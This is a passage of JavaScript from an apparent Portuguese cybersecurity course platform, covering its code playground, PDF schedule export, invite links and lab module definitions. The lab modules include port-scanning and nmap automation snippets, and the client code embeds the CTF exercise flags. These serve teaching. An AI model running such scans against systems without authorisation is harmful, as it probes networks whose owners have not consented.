                            <button class="pg-clear-btn" data-pg-sql-clear="${tab.id}">Limpar</button>
                            <span class="pg-hint">Ctrl+Enter para correr</span>
                        </div>
                        <div class="pg-repl-body">
                            <div class="pg-repl-editor-pane">
                                <div class="pg-editor-cm" id="${tab.id}-cm-host"></div>
                            </div>
                            <div class="pg-repl-history-pane">
                                <div class="pg-repl-history-header">Resultado</div>
                                <div class="pg-repl-history" id="${tab.id}-history">
                                    <div class="pg-repl-entry"><span class="pg-info">Escreve SQL acima e clica Correr</span></div>
                                </div>
                            </div>
                        </div>
                    </div>`;
                div.querySelector(`[data-pg-sql-run]`)?.addEventListener('click', () => pgSQLRun(tab.id));
                div.querySelector(`[data-pg-sql-clear]`)?.addEventListener('click', () => pgSQLClear(tab.id));
                // Inicializar CodeMirror SQL
                pgEnsureCM().then(() => pgEnsureCMSQL()).then(() => {
                    const host = document.getElementById(tab.id + '-cm-host');
                    if (!host || pg.editors[tab.id]) return;
                    const cm = CodeMirror(host, {
                        value: '',
                        mode: 'text/x-sql',
                        theme: 'dracula',
                        lineNumbers: true,
                        indentUnit: 4,
                        tabSize: 4,
                        indentWithTabs: false,
                        autoCloseBrackets: true,
                        matchBrackets: true,
                        lineWrapping: false,
                        extraKeys: {
                            'Ctrl-Enter': () => pgSQLRun(tab.id)
                        }
                    });
                    pg.editors[tab.id] = cm;
                });
            }
            wrap.appendChild(div);
        }

        // ── Python (Cloud Run) ──────────────────────────────────
        function pgPythonTabReady(tabId) {
            const btn = document.getElementById(tabId + '-run');
            if (btn) btn.disabled = false;
            const msg = CLOUDRUN_URL
                ? '# Python pronto — escreve código e clica Correr'
                : '# ⚠️ Servidor de execução não configurado';
            pgSetOutput(tabId, `<span class="pg-info">${msg}</span>`);
        }

        function pgEditorKey(e, tabId) { /* legacy — CodeMirror usa extraKeys */ }

        async function pgRunPython(tabId) {
            if (!CLOUDRUN_URL) {
                pgSetOutput(tabId, '<span class="pg-err">⚠️ Servidor de execução não configurado. Contacta o administrador.</span>');
                return;
            }
            if (pg.runningTabs.has(tabId)) return;

            pgSaveCurrentFile(tabId);
            const tab = pg.tabs.find(t => t.id === tabId);
            const files = tab.files
                .filter(f => f.code.trim())
                .map(f => ({
                    name: f.name,
                    // btoa sobre UTF-8: encodeURIComponent → unescape → Latin-1-safe → btoa
                    content_b64: btoa(unescape(encodeURIComponent(f.code)))
                }));
            if (!files.length) { pgSetOutput(tabId, '<span class="pg-info"># (sem código)</span>'); return; }

            const btn = document.getElementById(tabId + '-run');
            pg.runningTabs.add(tabId);
            if (btn) { btn.disabled = true; btn.textContent = '⏳ A correr…'; }
            const outputEl = document.getElementById(tabId + '-output');
            if (outputEl) outputEl.innerHTML = '';

            try {
                let token = null;
                try {
                    const user = firebase.auth().currentUser;
                    if (user) token = await user.getIdToken();
                } catch(_) {}

                const resp = await fetch(CLOUDRUN_URL + '/execute', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        ...(token ? { 'Authorization': `Bearer ${token}` } : {})
                    },
                    body: JSON.stringify({ files, timeout: 10 }),
                    signal: AbortSignal.timeout(15000)
                });

                if (!resp.ok) {
                    const txt = await resp.text().catch(() => '');
                    pgSetOutput(tabId, `<span class="pg-err">Erro do servidor (${resp.status})${txt ? ': ' + escapeHtml(txt.slice(0, 200)) : ''}</span>`);
                    return;
                }

                const { stdout, stderr, exit_code, elapsed_ms } = await resp.json();

                if (stdout) {
                    const span = document.createElement('span');
                    span.style.color = '#3fb950';
                    span.style.whiteSpace = 'pre-wrap';
                    span.textContent = stdout;
                    outputEl.appendChild(span);
                }
                if (stderr) {
                    const span = document.createElement('span');
                    span.style.color = '#f85149';
                    span.style.whiteSpace = 'pre-wrap';
                    span.textContent = stderr;
                    outputEl.appendChild(span);
                }
                if (elapsed_ms != null && (stdout || stderr)) {
                    const info = document.createElement('span');
                    info.className = 'pg-info';
                    info.textContent = `\n# concluído em ${elapsed_ms}ms`;
                    outputEl.appendChild(info);
                }
                if (!stdout && !stderr) pgSetOutput(tabId, '<span class="pg-info"># (sem output)</span>');

            } catch(e) {
                if (e.name === 'TimeoutError' || e.name === 'AbortError') {
                    pgSetOutput(tabId, '<span class="pg-err">⏱️ Timeout: o servidor não respondeu em 15s.</span>');
                } else {
                    pgSetOutput(tabId, `<span class="pg-err">${escapeHtml(e.message)}</span>`);
                }
            } finally {
                pg.runningTabs.delete(tabId);
                if (btn) { btn.disabled = false; btn.textContent = '▶ Correr'; }
            }
        }

        function pgSetOutput(tabId, html) {
            const el = document.getElementById(tabId + '-output');
            if (el) el.innerHTML = html;
        }
        function pgClearOutput(tabId) {
            pgSetOutput(tabId, '<span class="pg-info"># Output limpo</span>');
        }

        // ── SQL ─────────────────────────────────────────────
        async function pgEnsureCMSQL() {
            if (pg.cmSQLReady) return;
            await new Promise((res, rej) => {
                const src = `${CM_BASE}/mode/sql/sql.min.js`;
                if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
                const s = document.createElement('script'); s.src = src;
                if (_PG_SRI[src]) { s.integrity = _PG_SRI[src]; s.crossOrigin = 'anonymous'; }
                s.onload = () => { pg.cmSQLReady = true; res(); };
                s.onerror = rej;
                document.head.appendChild(s);
            });
        }

        async function pgEnsureSQL(tabId) {
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab) return;
            if (tab.db) return;
            if (pg.sqlLoading) {
                pgSQLAppend(tabId, 'info', 'A carregar SQLite…');
                while (pg.sqlLoading) await new Promise(r => setTimeout(r, 200));
            }
            if (!pg.SQL) {
                pg.sqlLoading = true;
                pgSQLAppend(tabId, 'info', 'A carregar sql.js (apenas na primeira vez)…');
                try {
                    await pgLoadScript('https://cdn.jsdelivr.net/npm/sql.js@1.10.3/dist/sql-asm.js');
                    if (typeof window.initSqlJs !== 'function') throw new Error("initSqlJs is not defined");
                    const p = window.initSqlJs();
                    pg.SQL = await Promise.race([
                        p,
                        new Promise((_, rej) => setTimeout(() => rej(new Error('Timeout a inicializar sql.js (demasiado lento)')), 15000))
                    ]);
                } catch(e) {
                    pgSQLAppend(tabId, 'err', 'Erro ao carregar sql.js: ' + e.message);
                    pg.sqlLoading = false;
                    return;
                }
                pg.sqlLoading = false;
            }
            tab.db = new pg.SQL.Database();
            pgSQLAppend(tabId, 'info', 'SQLite pronto — escreve SQL e clica Correr (ou Ctrl+Enter).');
            const runBtn = document.getElementById(tabId + '-run');
            if (runBtn) runBtn.disabled = false;
            pgGetCM(tabId)?.focus();
        }

        function pgSQLKey(e, tabId) { /* legacy */ }

        async function pgSQLRun(tabId) {
            const cm = pgGetCM(tabId);
            const cmd = cm ? cm.getValue().trim() : '';
            if (!cmd) return;
            await pgRunSQL(tabId, cmd);
        }

        function pgSQLClear(tabId) {
            const hist = document.getElementById(tabId + '-history');
            if (hist) hist.innerHTML = '<div class="pg-repl-entry"><span class="pg-info">Output limpo.</span></div>';
        }

        async function pgRunSQL(tabId, cmd) {
            // Mostrar preview curto do comando (primeira linha não-vazia)
            const firstLine = cmd.split('\\n').find(l => l.trim() && !l.trim().startsWith('--')) || cmd.split('\\n')[0];
            const stmtCount = (cmd.match(/;/g) || []).length;
            const label = stmtCount > 1 ? `${firstLine.trim()} … (${stmtCount} statements)` : firstLine.trim();
            pgSQLAppend(tabId, 'prompt', label);
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab) return;
            if (!tab.db) { await pgEnsureSQL(tabId); if (!tab.db) return; }
            try {
                const results = tab.db.exec(cmd);
                if (results.length === 0) {
                    pgSQLAppend(tabId, 'out', 'OK');
                } else {
                    results.forEach(r => pgSQLAppend(tabId, 'table', pgFormatTable(r)));
                }
            } catch(e) {
                pgSQLAppend(tabId, 'err', e.message);
            }
        }

        function pgSQLAppend(tabId, type, text) {
            const hist = document.getElementById(tabId + '-history');
            if (!hist) return;
            const div = document.createElement('div');
            div.className = 'pg-repl-entry';
            if (type === 'prompt') {
                div.innerHTML = `<span class="pg-repl-prompt">sqlite&gt; </span><span>${escapeHtml(text)}</span>`;
            } else if (type === 'table') {
                div.innerHTML = text;
            } else if (type === 'err') {
                div.innerHTML = `<span class="pg-repl-err">ERRO: ${escapeHtml(text)}</span>`;
            } else if (type === 'info') {
                div.innerHTML = `<span class="pg-info">${escapeHtml(text)}</span>`;
            } else {
                div.innerHTML = `<span class="pg-repl-out">${escapeHtml(text)}</span>`;
            }
            hist.appendChild(div);
            hist.scrollTop = hist.scrollHeight;
        }

        function pgFormatTable(result) {
            const cols = result.columns;
            const rows = result.values;
            const esc = s => escapeHtml(String(s ?? 'NULL'));
            const rowCount = rows.length + ' ' + (rows.length === 1 ? 'linha' : 'linhas');
            const thead = `<tr>${cols.map(c => `<th>${esc(c)}</th>`).join('')}</tr>`;
            const tbody = rows.map((r, i) =>
                `<tr class="${i % 2 === 1 ? 'pg-tbl-alt' : ''}">${r.map(v => `<td>${esc(v)}</td>`).join('')}</tr>`
            ).join('');
            return `<div class="pg-sql-table-wrap"><table class="pg-sql-table"><thead>${thead}</thead><tbody>${tbody}</tbody></table><div class="pg-sql-row-count">${rowCount}</div></div>`;
        }

        function pgLoadScript(url) {
            return new Promise((resolve, reject) => {
                if (document.querySelector(`script[src="${url}"]`)) { resolve(); return; }
                const s = document.createElement('script');
                s.src = url;
                if (_PG_SRI[url]) { s.integrity = _PG_SRI[url]; s.crossOrigin = 'anonymous'; }
                s.onload = resolve;
                s.onerror = () => reject(new Error('Falha ao carregar: ' + url));
                document.head.appendChild(s);
            });
        }


        // ── PDF DOWNLOAD ────────────────────────────────────────────────
        async function downloadListaPDF(btn, monthIdx) {
            const horario = HORARIOS[monthIdx !== undefined ? monthIdx : currentMonthIndex];
            if (!horario) return;

            btn.classList.add('loading');
            btn.textContent = '⏳ A gerar...';

            try {
                await ensurePdfLibs();
            } catch (e) {
                console.error(e);
                alert('Não foi possível carregar a biblioteca de PDF. Verifica a ligação à internet.');
                btn.classList.remove('loading');
                btn.innerHTML = '⬇ Lista';
                return;
            }
            const { jsPDF } = window.jspdf;

            setTimeout(() => {
                try {
                    const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
                    const monthTitle = horario.mes_ano.charAt(0).toUpperCase() + horario.mes_ano.slice(1);
                    const pageW = 210;

                    // ── Header bar ──────────────────────────────────────
                    doc.setFillColor(5, 5, 5);
                    doc.rect(0, 0, pageW, 36, 'F');

                    // Blue accent line at bottom of header
                    doc.setFillColor(0, 143, 17);
                    doc.rect(0, 34, pageW, 2, 'F');

                    // Shield icon area
                    doc.setFillColor(0, 143, 17);
                    doc.roundedRect(10, 6, 22, 22, 3, 3, 'F');
                    doc.setTextColor(255, 255, 255);
                    doc.setFontSize(14);
                    doc.text('🛡', 15.5, 20);

                    // Title & subtitle
                    doc.setFontSize(14);
                    doc.setFont('helvetica', 'bold');
                    doc.setTextColor(255, 255, 255);
                    doc.text('Horário — ' + monthTitle, 36, 15);

                    doc.setFontSize(8);
                    doc.setFont('helvetica', 'normal');
                    doc.setTextColor(139, 148, 158);
                    const institution = (horario.instituicao || 'IEFP Faro') + '  ·  ' + (horario.designacao || 'CET Cibersegurança');
                    doc.text(institution, 36, 23);
                    doc.text((horario.modalidade || ''), 36, 29);

                    // ── Build table rows ────────────────────────────────
                    const rows = [];
                    horario.dias.forEach(dia => {
                        const merged = mergeTimeSlots(dia.aulas);
                        if (merged.length > 0) {
                            merged.forEach((aula, idx) => {
                                rows.push([
                                    idx === 0 ? dia.data : '',
                                    idx === 0 ? dia.dia_semana : '',
                                    aula.hora,
                                    aula.uc,
                                    aula.descricao || aula.uc,
                                    shortName(aula.formador) || '—'
                                ]);
                            });
                        } else if (dia.nota) {
                            rows.push([dia.data, dia.dia_semana, '—', '—', dia.nota, '—']);
                        }
                    });

                    // ── AutoTable ───────────────────────────────────────
                    doc.autoTable({
                        startY: 40,
                        head: [['Data', 'Dia', 'Horário', 'UC', 'Disciplina', 'Formador']],
                        body: rows,
                        theme: 'grid',
                        headStyles: {
                            fillColor: [0, 143, 17],
                            textColor: 255,
                            fontStyle: 'bold',
                            fontSize: 8,
                            cellPadding: { top: 3, bottom: 3, left: 3, right: 3 }
                        },
                        bodyStyles: { fontSize: 7.5, cellPadding: 2.5, textColor: [30, 30, 30] },
                        alternateRowStyles: { fillColor: [240, 245, 255] },
                        columnStyles: {
                            0: { cellWidth: 22, fontStyle: 'bold' },
                            1: { cellWidth: 16 },
                            2: { cellWidth: 24, textColor: [0, 143, 17], fontStyle: 'bold' },
                            3: { cellWidth: 20 },
                            4: { cellWidth: 'auto' },
                            5: { cellWidth: 32 }
                        },
                        didParseCell: (data) => {
                            // Highlight holiday rows
                            if (data.row.raw && data.row.raw[3] === '—' && data.row.raw[2] === '—') {
                                data.cell.styles.fillColor = [247, 240, 255];
                                data.cell.styles.textColor = [137, 87, 229];
                            }
                        },
                        margin: { left: 10, right: 10 }
                    });

                    // ── Footer on each page ─────────────────────────────
                    const pageCount = doc.internal.getNumberOfPages();
                    for (let i = 1; i <= pageCount; i++) {
                        doc.setPage(i);
                        doc.setFontSize(7);
                        doc.setTextColor(150);
                        const now = new Date().toLocaleDateString('pt-PT');
                        doc.text(
                            `Gerado em ${now}  ·  Página ${i} de ${pageCount}`,
                            pageW / 2, 289, { align: 'center' }
                        );
                        // Bottom accent line
                        doc.setFillColor(0, 143, 17);
                        doc.rect(0, 291, pageW, 1.5, 'F');
                    }

                    const filename = `horario_${horario.mes_ano.replace(/\\s+/g, '_')}.pdf`;
                    doc.save(filename);
                } catch(e) {
                    console.error(e);
                    alert('Erro ao gerar o PDF. Verifica a consola.');
                } finally {
                    btn.classList.remove('loading');
                    btn.innerHTML = '⬇ Lista';
                }
            }, 50);
        }

        async function downloadSemanalPDF(btn, monthIdx) {
            const horario = HORARIOS[monthIdx !== undefined ? monthIdx : currentMonthIndex];
            if (!horario) return;

            btn.classList.add('loading');
            btn.textContent = '⏳ A gerar...';

            try {
                await ensurePdfLibs();
            } catch (e) {
                console.error(e);
                alert('Não foi possível carregar a biblioteca de PDF. Verifica a ligação à internet.');
                btn.classList.remove('loading');
                btn.innerHTML = '⬇ Semanal';
                return;
            }
            const { jsPDF } = window.jspdf;

            setTimeout(() => {
                try {
                    const doc  = new jsPDF({ orientation: 'landscape', unit: 'mm', format: 'a4' });
                    const pageW = 297;
                    const pageH = 210;
                    const pad   = n => String(n).padStart(2, '0');
                    const monthTitle = horario.mes_ano.charAt(0).toUpperCase() + horario.mes_ano.slice(1);
                    const DAY_NAMES  = ['Segunda', 'Terça', 'Quarta', 'Quinta', 'Sexta'];

                    // ── Header ──────────────────────────────────────────
                    function drawHeader(pageTitle) {
                        doc.setFillColor(5, 5, 5);
                        doc.rect(0, 0, pageW, 28, 'F');
                        doc.setFillColor(0, 143, 17);
                        doc.rect(0, 26, pageW, 2, 'F');
                        doc.roundedRect(10, 5, 18, 18, 3, 3, 'F');
                        doc.setTextColor(255, 255, 255);
                        doc.setFontSize(11);
                        doc.setFont('helvetica', 'bold');
                        doc.text(pageTitle, 32, 13);
                        doc.setFontSize(7);
                        doc.setFont('helvetica', 'normal');
                        doc.setTextColor(139, 148, 158);
                        doc.text('IEFP Faro  ·  CET Cibersegurança  ·  Gerado em ' + new Date().toLocaleDateString('pt-PT'), 32, 21);
                    }
                    drawHeader('Horário Semanal — ' + monthTitle);

                    // ── Group days by week ───────────────────────────────
                    const byWeek = {};
                    horario.dias.forEach(dia => {
                        const wk = getWeekStart(dia.data);
                        if (!byWeek[wk]) byWeek[wk] = {};
                        byWeek[wk][dia.data] = dia;
                    });

                    // ── Render weeks ─────────────────────────────────────
                    let y = 32;
                    const weekKeys = Object.keys(byWeek).sort();

                    weekKeys.forEach((weekStart, wi) => {
                        const [wy, wm, wd] = weekStart.split('-').map(Number);
                        const monDate = new Date(wy, wm - 1, wd);

                        // Column headers: day name + date
                        const headRow = DAY_NAMES.map((name, i) => {
                            const dt = new Date(monDate);
                            dt.setDate(monDate.getDate() + i);
                            return name + '\\n' + pad(dt.getDate()) + '/' + pad(dt.getMonth() + 1);
                        });

                        // Body: one row, 5 cells
                        const bodyRow = DAY_NAMES.map((_, i) => {
                            const dt = new Date(monDate);
                            dt.setDate(monDate.getDate() + i);
                            const dateStr = dt.getFullYear() + '-' + pad(dt.getMonth() + 1) + '-' + pad(dt.getDate());
                            const dia = (byWeek[weekStart] || {})[dateStr];
                            if (!dia) return '';
                            const merged = mergeTimeSlots(dia.aulas);
                            if (merged.length === 0) return dia.nota || '';
                            return merged.map(a => {
                                const desc = (a.descricao || a.uc).substring(0, 52);
                                return a.hora + '\\n' + a.uc + ' — ' + desc;
                            }).join('\\n\\n');
                        });

                        // Week label
                        const friDate = new Date(monDate);
                        friDate.setDate(monDate.getDate() + 4);
                        const weekLabel = 'Semana ' + pad(monDate.getDate()) + '–' + pad(friDate.getDate()) + ' ' + horario.mes_ano.split(' ')[0];

                        // New page if needed
                        if (y > pageH - 45 && wi > 0) {
                            doc.addPage();
                            drawHeader('Horário Semanal — ' + monthTitle + ' (cont.)');
                            y = 32;
                        }

                        // Week label text
                        doc.setFontSize(6.5);
                        doc.setFont('helvetica', 'bold');
                        doc.setTextColor(0, 143, 17);
                        doc.text(weekLabel.toUpperCase(), 10, y + 3.5);

                        doc.autoTable({
                            startY: y + 5,
                            head: [headRow],
                            body: [bodyRow],
                            theme: 'grid',
                            headStyles: {
                                fillColor: [0, 143, 17],
                                textColor: 255,
                                fontStyle: 'bold',
                                fontSize: 7.5,
                                halign: 'center',
                                cellPadding: { top: 2.5, bottom: 2.5, left: 2, right: 2 }
                            },
                            bodyStyles: {
                                fontSize: 7,
                                cellPadding: { top: 3, bottom: 3, left: 3, right: 3 },
                                textColor: [20, 20, 20],
                                valign: 'top',
                                minCellHeight: 10
                            },
                            didParseCell: (data) => {
                                if (data.section === 'body') {
                                    const raw = (data.cell.raw || '').toString();
                                    // Holiday cell
                                    if (raw && !raw.includes(':')) {
                                        data.cell.styles.fillColor  = [247, 240, 255];
                                        data.cell.styles.textColor  = [137, 87, 229];
                                        data.cell.styles.fontStyle  = 'italic';
                                    }
                                    // Empty cell
                                    if (!raw) {
                                        data.cell.styles.fillColor = [248, 248, 248];
                                    }
                                }
                                // Highlight today
                                if (data.section === 'head') {
                                    const now = new Date();
                                    const todayStr = pad(now.getDate()) + '/' + pad(now.getMonth() + 1);
                                    if ((data.cell.raw || '').toString().includes(todayStr)) {
                                        data.cell.styles.fillColor = [0, 80, 10];
                                    }
                                }
                            },
                            margin: { left: 10, right: 10 }
                        });

                        y = doc.lastAutoTable.finalY + 5;
                    });

                    // ── Footer on each page ──────────────────────────────
                    const pageCount = doc.internal.getNumberOfPages();
                    for (let i = 1; i <= pageCount; i++) {
                        doc.setPage(i);
                        doc.setFontSize(6.5);
                        doc.setTextColor(150);
                        doc.text(
                            'Página ' + i + ' de ' + pageCount,
                            pageW / 2, pageH - 4, { align: 'center' }
                        );
                        doc.setFillColor(0, 143, 17);
                        doc.rect(0, pageH - 2, pageW, 1.5, 'F');
                    }

                    doc.save('horario_semanal_' + horario.mes_ano.replace(/\\s+/g, '_') + '.pdf');
                } catch(e) {
                    console.error(e);
                    alert('Erro ao gerar o PDF semanal. Verifica a consola.');
                } finally {
                    btn.classList.remove('loading');
                    btn.innerHTML = '⬇ Semanal';
                }
            }, 50);
        }



        // ── CONVITES ─────────────────────────────────────────────────────
        function genToken() {
            const arr = new Uint8Array(32);
            crypto.getRandomValues(arr);
            return Array.from(arr).map(b => b.toString(16).padStart(2,'0')).join('');
        }

        async function createInvite(type) {
            const token = genToken();
            const isIndividual = type === 'individual';
            const uid  = auth.currentUser?.uid;
            const name = auth.currentUser?.displayName || auth.currentUser?.email || '–';
            try {
                await db.collection('invites').doc(token).set({
                    token,
                    type,
                    createdBy:      uid,
                    createdByName:  name,
                    createdAt:      firebase.firestore.FieldValue.serverTimestamp(),
                    expiresAt:      isIndividual
                        ? new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 dias
                        : null,
                    maxUses:        isIndividual ? 1 : null,
                    uses:           0,
                    usedBy:         [],
                    active:         true,
                });
                toast(isIndividual ? 'Convite individual criado (7 dias)' : 'Link de turma criado');
            } catch(e) {
                toast('Erro ao criar convite: ' + e.message, 'error');
            }
        }

        async function revokeInvite(token) {
            if (!confirm('Revogar este convite? Links existentes deixarão de funcionar.')) return;
            try {
                await db.collection('invites').doc(token).update({ active: false });
                toast('Convite revogado');
            } catch(e) {
                toast('Erro: ' + e.message, 'error');
            }
        }

        async function deleteInvite(token) {
            if (!confirm('Apagar este convite permanentemente?')) return;
            try {
                await db.collection('invites').doc(token).delete();
                toast('Convite apagado');
            } catch(e) {
                toast('Erro: ' + e.message, 'error');
            }
        }

        function loadInvites() {
            const list = document.getElementById('invite-list');
            if (!list) return;
            const uid = auth.currentUser?.uid;
            if (!uid) return;

            if (window._invitesUnsub) {
                window._invitesUnsub();
                window._invitesUnsub = null;
            }

            list.innerHTML = '<span class="jshook-muted-xs">A carregar…</span>';
            applyDeferredStyles(list);

            window._invitesUnsub = db.collection('invites')
                .where('createdBy', '==', uid)
                .onSnapshot(snap => {
                    if (snap.empty) {
                        list.innerHTML = '<span class="jshook-muted-xs">Nenhum convite criado ainda.</span>';
                        applyDeferredStyles(list);
                        return;
                    }
                    list.innerHTML = '';
                    const docs = snap.docs.slice().sort((a, b) => {
                        const ta = a.data().createdAt?.toMillis?.() || 0;
                        const tb = b.data().createdAt?.toMillis?.() || 0;
                        return tb - ta;
                    });
                    docs.forEach(doc => {
                        const inv  = doc.data();
                        const card = renderInviteCard(doc.id, inv);
                        list.appendChild(card);
                    });
                }, () => {
                    list.innerHTML = '<span class="jshook-muted-xs">Erro ao carregar convites.</span>';
                    applyDeferredStyles(list);
                });
        }

        function unsubscribeInvites() {
            if (window._invitesUnsub) {
                window._invitesUnsub();
                window._invitesUnsub = null;
            }
        }

        function renderInviteCard(token, inv) {
            const link    = `${window.location.origin}${window.location.pathname}?invite=${token}`;
            const isUsed  = inv.maxUses !== null && inv.uses >= inv.maxUses;
            const status  = !inv.active ? 'revoked' : isUsed ? 'used' : 'active';
            const statusLabel = { active: '● ativo', revoked: '● revogado', used: '✓ usado' }[status];
            const expiry  = inv.expiresAt
                ? inv.expiresAt.toDate?.().toLocaleDateString('pt-PT', {day:'2-digit',month:'short',year:'numeric'}) || '–'
                : 'sem expiração';

            const div = document.createElement('div');
            div.className = `invite-card${status === 'revoked' ? ' revoked' : ''}`;
            const safeType   = escapeHtml(inv.type || '');
            const safeExpiry = escapeHtml(expiry);
            div.innerHTML = `
                <div class="invite-card-header">
                    <div class="jshook-flex-gap4-center">
                        <span class="invite-type-badge ${safeType}">${safeType === 'individual' ? '👤 Individual' : '👥 Turma'}</span>
                        <span class="invite-status-badge ${escapeHtml(status)}">${escapeHtml(statusLabel)}</span>
                    </div>
                    <span class="jshook-uses-count">${inv.uses || 0} uso${inv.uses !== 1 ? 's' : ''}</span>
                </div>
                <div class="invite-meta">
                    Expira: ${safeExpiry}
                    ${inv.createdAt?.toDate ? ' · criado ' + escapeHtml(inv.createdAt.toDate().toLocaleDateString('pt-PT')) : ''}
                </div>
                <div class="invite-actions">
                    <button class="invite-action-btn" data-copy-link>📋 Copiar link</button>
                    <button class="invite-action-btn" data-qr-btn>📷 QR Code</button>
                    ${inv.active ? `<button class="invite-action-btn danger" data-revoke-invite>🚫 Revogar</button>` : ''}
                    <button class="invite-action-btn danger" data-del-invite>🗑️ Apagar</button>
                </div>
                <div class="invite-qr-wrap jshook-qr-wrap" id="qr-${token}"></div>`;
            div.querySelector('[data-copy-link]')?.addEventListener('click', () =>
                navigator.clipboard.writeText(link).then(() => toast('Link copiado!'))
            );
            div.querySelector('[data-qr-btn]')?.addEventListener('click', function() {
                toggleQR(this, token, link);
            });
            div.querySelector('[data-revoke-invite]')?.addEventListener('click', () => revokeInvite(token));
            div.querySelector('[data-del-invite]')?.addEventListener('click', () => deleteInvite(token));
            applyDeferredStyles(div);
            return div;
        }

        async function toggleQR(btn, token, link) {
            const wrap = document.getElementById('qr-' + token);
            if (!wrap) return;
            if (wrap.style.display !== 'none') {
                wrap.style.display = 'none';
                return;
            }
            wrap.style.display = 'inline-block';
            if (!wrap.dataset.rendered) {
                try {
                    await ensureQrLib();
                } catch (e) {
                    console.error(e);
                    wrap.textContent = 'Erro ao carregar QR.';
                    return;
                }
                wrap.dataset.rendered = '1';
                new QRCode(wrap, { text: link, width: 160, height: 160, correctLevel: QRCode.CorrectLevel.H });
            }
        }


        // ── DEFINIÇÕES ──────────────────────────────────────────────────
        function settingsUpdateUser() {
            const user = auth.currentUser;
            if (!user) return;
            const nameEl  = document.getElementById('settings-user-name');
            const emailEl = document.getElementById('settings-user-email');
            if (nameEl)  nameEl.textContent  = user.displayName || '–';
            if (emailEl) emailEl.textContent = user.email || '–';
        }


        // ── LAB (BETA) ──────────────────────────────────────────────────

        const LAB_MODULES = [
            {
                id: 'py',
                num: 'PY',
                icon: '🐍',
                name: 'Python para Cibersegurança',
                desc: 'Python contextualizado em segurança — scripts de ataque, defesa e automação de ferramentas.',
                tools: ['Python 3', 'socket', 'requests', 'subprocess', 'scapy'],
                xp: 300,
                alwaysAvailable: true,
                ctfFlag: 'flag{py_recon_script_done}',
                ctfTitle: 'Mini-Scanner de Reconhecimento',
                ctfDesc: 'Constrói um script Python que aceita um domínio como argumento, resolve DNS, testa portas comuns e gera um relatório `.txt`.',
                ctfObjective: 'Abre o Playground → exemplo **🔍 Mini-Scanner (CTF)**, corre o script e submete a flag que aparece no output.',
                ctfHint: 'Usa `socket.getaddrinfo()` para DNS, `socket.connect_ex()` para portas e `requests.get()` para headers HTTP.',
                theory: {
                    concepts: [
                        'Python para segurança — porquê e como',
                        'Variáveis, tipos, condições, ciclos, funções',
                        'Módulo `os` e `subprocess` — executar comandos',
                        'Módulo `socket` — TCP/UDP e port scanning',
                        'Módulo `requests` — pedidos HTTP e análise de respostas',
                        'Módulo `scapy` — manipulação de pacotes de rede',
                    ],
                    resources: [
                        'Python Docs — socket module',
                        'Automate the Boring Stuff with Python',
                        'Black Hat Python (Justin Seitz)',
                        'realpython.com — Sockets in Python',
                    ],
                },
                steps: [
                    {
                        title: 'Unidade 1 — Primeiros passos',
                        desc: 'Variáveis, tipos, condições, ciclos e funções. Script que lê um IP e diz se é privado ou público.',
                        cmd: 'import ipaddress\nip = input("IP: ")\nobj = ipaddress.ip_address(ip)\nprint("Privado" if obj.is_private else "Público")',
                        xp: 40,
                    },
                    {
                        title: 'Unidade 2 — Ficheiros e strings',
                        desc: 'Ler ficheiros, manipular strings com regex. Parsear output do Nmap e extrair portas abertas.',
                        cmd: 'import re\nwith open("nmap_output.txt") as f:\n    for line in f:\n        m = re.search(r\'(\\d+)/tcp\\s+open\', line)\n        if m: print(f"Porta aberta: {m.group(1)}")',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 3 — Módulos essenciais',
                        desc: 'os, subprocess, sys, requests. Script que faz GET a uma lista de URLs e reporta status codes.',
                        cmd: 'import requests\nurls = ["http://example.com", "http://httpbin.org/status/404"]\nfor url in urls:\n    r = requests.get(url, timeout=5)\n    print(f"{url} → {r.status_code}")',
                        xp: 50,
                    },
                    {
                        title: 'Unidade 4 — Redes com Python',
                        desc: 'Sockets TCP/UDP. Port scanner simples, depois com threading.',
                        cmd: 'import socket\ndef scan(host, port):\n    s = socket.socket()\n    s.settimeout(0.5)\n    return s.connect_ex((host, port)) == 0\nfor p in [21,22,80,443,3306]:\n    if scan("192.168.1.1", p): print(f"{p}/tcp open")',
                        xp: 60,
                    },
                    {
                        title: 'Unidade 5 — Automação de segurança',
                        desc: 'Automatizar Nmap, parsear XML, escrever relatório .txt.',
                        cmd: 'import subprocess, xml.etree.ElementTree as ET\nresult = subprocess.run(["nmap","-oX","out.xml","192.168.1.1"], capture_output=True)\ntree = ET.parse("out.xml")\nfor port in tree.findall(".//port[@protocol=\'tcp\']"):\n    print(port.get("portid"), port.find("state").get("state"))',
                        xp: 60,
                    },
                    {
                        title: 'Unidade 6 — Projecto final Python',
                        desc: 'Mini-scanner: DNS, port scan, HTTP headers, relatório .txt. Aceita domínio como argumento.',
                        cmd: 'python3 scanner.py target.com\n# Output: DNS records, open ports, HTTP headers → report.txt',
                        xp: 50,
                    },
                ],
            },
            {
                id: 'sql',
                num: 'SQL',
                icon: '🗄️',
                name: 'SQL para Cibersegurança',
                desc: 'SQL em contexto de segurança — perceber bases de dados para explorar e defender contra SQLi.',
                tools: ['MySQL', 'PostgreSQL', 'DVWA', 'pgAdmin', 'Supabase'],
                xp: 250,
                alwaysAvailable: true,
                ctfFlag: 'flag{sql_vuln_schema_done}',
                ctfTitle: 'Schema de Gestão de Vulnerabilidades',
                ctfDesc: 'Constrói o schema SQL completo de uma app de gestão de vulnerabilidades com 5 tabelas e escreve queries de análise.',
                ctfObjective: 'Cria as tabelas, insere dados de teste e executa a query de CVEs críticos dos últimos 30 dias.',
                ctfHint: 'Usa `WHERE severidade = \'critical\' AND criado_em >= NOW() - INTERVAL 30 DAY` na tabela `vulnerabilidades`.',
                theory: {
                    concepts: [
                        'Bases de dados relacionais — tabelas, colunas, tipos',
                        'SELECT, FROM, WHERE, ORDER BY, LIMIT',
                        'INSERT, UPDATE, DELETE, CREATE TABLE, DROP TABLE',
                        'JOINs (INNER, LEFT, RIGHT) e subqueries',
                        'GROUP BY, HAVING e funções de agregação',
                        'SQL Injection — como funciona e como prevenir',
                    ],
                    resources: [
                        'SQLZoo — aprender SQL interactivo',
                        'OWASP SQL Injection Prevention Cheat Sheet',
                        'PostgreSQL Documentation',
                        'HackTricks — SQL Injection',
                    ],
                },
                steps: [
                    {
